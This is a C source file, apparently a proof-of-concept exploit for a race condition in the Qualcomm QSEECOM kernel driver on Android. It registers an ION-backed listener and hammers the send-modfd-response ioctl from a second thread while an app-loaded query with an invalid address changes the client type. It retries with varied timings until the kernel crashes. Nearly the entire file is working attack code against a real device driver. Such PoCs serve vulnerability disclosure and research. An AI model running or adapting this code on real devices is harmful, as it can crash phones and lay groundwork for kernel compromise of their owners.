#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <pthread.h>

#include "ion.h"
#include "msm_ion.h"
#include "qseecom.h"

#define ION_SIZE (0x1000)
#define ION_HEAP_ID (19)
#define LISTENER_ID_BASE (13370000)
#define INVALID_USER_ADDR ((void *)0xdeadbeef)

typedef struct {
    int dev_fd;
    ion_user_handle_t handle;
    int map_fd;
    void *map;
    size_t size;
} ion_data_t;

typedef struct {
    int qseecom_fd;
    struct qseecom_send_modfd_listener_resp resp;
} thread_data_t;

// Free data from ion_memalloc
static void ion_memfree(ion_data_t *ion_data) {
    struct ion_handle_data handle_data = { .handle = ion_data->handle };

    if (MAP_FAILED != ion_data->map) {
        munmap(ion_data->map, ion_data->size);
        ion_data->map = MAP_FAILED;
    }

    if (-1 != ion_data->map_fd) {
        close(ion_data->map_fd);
        ion_data->map_fd = -1;
    }

    if (0 != ion_data->handle) {
        ioctl(ion_data->dev_fd, ION_IOC_FREE, &handle_data);
        ion_data->handle = 0;
    }

    if (-1 != ion_data->dev_fd) {
        close(ion_data->dev_fd);
        ion_data->dev_fd = -1;
    }
}

// Allocate and map an ION mapping
// Should be freed using ion_memfree
static int ion_memalloc(size_t size, int heap_id, ion_data_t *ion_data) {
    int result = 0;
    struct ion_allocation_data alloc_data = { .align = 0x1000, .len = size,
        .heap_id_mask = ION_HEAP(heap_id), .flags = 0, .handle = 0 };
    struct ion_fd_data fd_data = {0};

    ion_data->dev_fd = -1;
    ion_data->handle = 0;
    ion_data->map_fd = -1;
    ion_data->map = MAP_FAILED;
    ion_data->size = size;

    ion_data->dev_fd = open("/dev/ion", O_RDONLY);
    if (-1 == ion_data->dev_fd) {
        result = 1;
        goto cleanup;
    }

    if (0 != ioctl(ion_data->dev_fd, ION_IOC_ALLOC, &alloc_data)) {
        result = 2;
        goto cleanup;
    }
    ion_data->handle = alloc_data.handle;

    fd_data.handle = alloc_data.handle;
    if (0 != ioctl(ion_data->dev_fd, ION_IOC_MAP, &fd_data)) {
        result = 3;
        goto cleanup;
    }
    ion_data->map_fd = fd_data.fd;

    ion_data->map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
            ion_data->map_fd, 0);
    if (MAP_FAILED == ion_data->map) {
        result = 4;
        goto cleanup;
    }

cleanup:
    if (0 != result) {
        ion_memfree(ion_data);
    }
    return result;
}

static int register_listener(int qseecom_fd, uint32_t listener_id,
        ion_data_t *ion_data) {
    struct qseecom_register_listener_req req = { .listener_id = listener_id,
        .ifd_data_fd = ion_data->map_fd, .virt_sb_base = ion_data->map,
        .sb_size = ion_data->size };
    return ioctl(qseecom_fd, QSEECOM_IOCTL_REGISTER_LISTENER_REQ, &req);
}

static void *send_modfd_resp_thread(void *thread_arg) {
    thread_data_t *thread_data = (thread_data_t *)thread_arg;
    // Call QSEECOM_IOCTL_SEND_MODFD_RESP_64 repeatedly until it fails due to
    // the change of data->type (or due to crash...)
    while (0 == ioctl(thread_data->qseecom_fd,
                QSEECOM_IOCTL_SEND_MODFD_RESP_64,
                &thread_data->resp));
    if (EINVAL != errno) {
        perror("Unexpected send_modfd_resp_thread: ");
        return (void *)1;
    }
    return NULL;
}

static int try_race(ion_data_t *ion_data) {
    size_t i = 0;
    size_t j = 0;
    pthread_t thread;
    void *thread_retval = NULL;
    thread_data_t thread_data = { .qseecom_fd = -1, .resp = {
        .resp_buf_ptr = ion_data->map, .resp_len = ion_data->size } };
    // For more chances of hitting the race, use all ifd_datas
    for (; j < MAX_ION_FD; j++) {
        thread_data.resp.ifd_data[j].fd = ion_data->map_fd;
        thread_data.resp.ifd_data[j].cmd_buf_offset = j * 8;
    }

    for (;; i++) {
        printf("Trying race, attempt #%zu\n", i + 1);

        thread_data.qseecom_fd = open("/dev/qseecom", O_RDWR);
        if (-1 == thread_data.qseecom_fd) {
            perror("Failed opening /dev/qseecom: ");
            return 1;
        }

        if (0 != register_listener(thread_data.qseecom_fd,
                    i + LISTENER_ID_BASE, ion_data)) {
            perror("register_listener failed: ");
            return 2;
        }

        // Spawn a thread which constantly runs send_modfd_resp
        if (0 != pthread_create(&thread, NULL, send_modfd_resp_thread,
                    &thread_data)) {
            perror("pthread_create failed: ");
            return 3;
        }

        // Try different sleep times in order to trigger the race
        usleep((i / 4) * 100);

        // The ioctl will fail due to invalid request address, but data->type
        // will still be set to QSEECOM_CLIENT_APP
        if (0 == ioctl(thread_data.qseecom_fd,
                    QSEECOM_IOCTL_APP_LOADED_QUERY_REQ,
                    INVALID_USER_ADDR) || EFAULT != errno) {
            perror("app_loaded_query unexpected result: ");
            return 4;
        }

        // If we reached here then no crash occured
        printf("Attempt #%zu failed, retrying\n\n", i + 1);
        if (0 != pthread_join(thread, &thread_retval)) {
            perror("pthread_join failed: ");
            return 5;
        } else if (NULL != thread_retval) {
            return 6;
        }
        close(thread_data.qseecom_fd);
    }
}

int main(int argc, const char **argv) {
    int result = 0;
    ion_data_t ion_data = {0};

    result = ion_memalloc(ION_SIZE, ION_HEAP_ID, &ion_data);
    if (0 != result) {
        fprintf(stderr, "ion_memalloc failed, ret = %d, ", result);
        perror(NULL);
        goto cleanup;
    }

    result = try_race(&ion_data);

cleanup:
    ion_memfree(&ion_data);
    return result;
}
